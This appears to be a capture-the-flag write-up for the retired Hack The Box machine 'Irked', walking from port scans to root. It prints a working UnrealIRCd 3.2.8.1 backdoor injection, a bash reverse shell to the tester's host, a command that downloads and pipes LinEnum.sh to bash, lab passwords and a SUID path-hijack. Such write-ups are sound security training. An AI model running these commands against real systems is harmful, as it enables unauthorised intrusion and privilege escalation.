# Irked

This is the write-up for the box Irked that got retired at the 27th April 2019.
My IP address was 10.10.14.14 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.117    irked.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/irked.nmap 10.10.10.117
```

```markdown
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          51139/udp   status
|   100024  1          51821/tcp6  status
|   100024  1          53889/udp6  status
|_  100024  1          54177/tcp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port scan:
```markdown
nmap -p- 10.10.10.117
```
```markdown
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
54177/tcp open  unknown
65534/tcp open  unknown
```

Running default Nmap scripts on the found ports:
```markdown
nmap -sC -sV -p 6697,8067,54177,65534 10.10.10.117
```
```markdown
PORT      STATE SERVICE VERSION
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
54177/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
```

## Checking HTTP (Port 80)

On the web page is a frustrated emoji image called _irked.jpg_ and the text _"IRC is almost working!"_.
Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.117 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the directory _/manual_ which is the default Apache documentation and nothing else.

## Checking IRC (Port 6697 & 8067)

There is an **Internet Relay Chat (IRC)** service running on the box, so lets connect on the IRC service to get more information:
```markdown
ncat 10.10.10.117 8067

:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
PASS testpass
NICK testuser
USER testuser testclient irked :testuser
```
```markdown
:irked.htb 001 testuser :Welcome to the ROXnet IRC Network testuser!testuser@10.10.14.14
:irked.htb 002 testuser :Your host is irked.htb, running version Unreal3.2.8.1
:irked.htb 003 testuser :This server was created Mon May 14 2018 at 13:12:50 EDT
(...)
```

It shows that it is running **Unreal IRC 3.2.8.1** and was created on May 14 2018.
Checking if this version has known vulnerabilities:
```markdown
searchsploit unrealirc
```
```markdown
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute
```

The [UnrealIRC Backdoor Command Execution](https://lwn.net/Articles/392201/) seems to be the way to exploit this box.
Arbitrary code can be executed by sending _"AB"_ and a command to the server.
This can be tested by listening on incoming ICMP packets and sending a `ping` to ourselves:
```markdown
echo "AB; ping -c 1 10.10.14.14" | ncat 10.10.10.117 8067
```

It pings us once, which means that code execution is possible, so lets get a reverse shell:
```markdown
echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'" | ncat 10.10.10.117 8067
```

The listener on my IP and port 9001 starts a reverse shell session as the user _ircd_.

## Privilege Escalation

There is another user called _djmardov_ with a home directory and there is a hidden file _/home/djmardov/Documents/.backup_ which says the following:
```markdown
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

The word _steg_ is short for **Steganography** and the password seems to be the password for a file that has hidden data in it.
There was one image file at the beginning on the web page called _irked.jpg_ which could be the file.

Trying to extract hidden data out of _irked.jpg_ with **Steghide**:
```markdown
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```

It extracts _pass.txt_ with a string that looks like a password:
> Kab6h+m+bbp2J:HG

Trying to log in with _djmardov_ via SSH:
```markdown
ssh djmardov@10.10.10.117
```

The credentials work and privileges got escalated to _djmardov_.

### Privilege Escalation to root

To get an attack surface to get to root, any **Linux Enumeration script** should be run:
```markdown
wget 10.10.14.14/LinEnum.sh | bash
```

After analyzing the output, there is a binary with the **SetUID bit** set called _viewuser_, which is not a default binary.
When executing, it shows the following output:
```markdown
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-10-31 13:05 (:0)
djmardov pts/1        2020-10-31 14:18 (10.10.14.14)
sh: 1: /tmp/listusers: not found
```

It looks like that it is trying to execute _/tmp/listusers_ but this file does not exist.
Lets create it, give it execute permissions and try to run own code:
```markdown
#!/bin/bash

/bin/bash
```
```markdown
viewuser
```

After running _viewuser_, it also executes _/tmp/listusers_ and starts a shell as root!
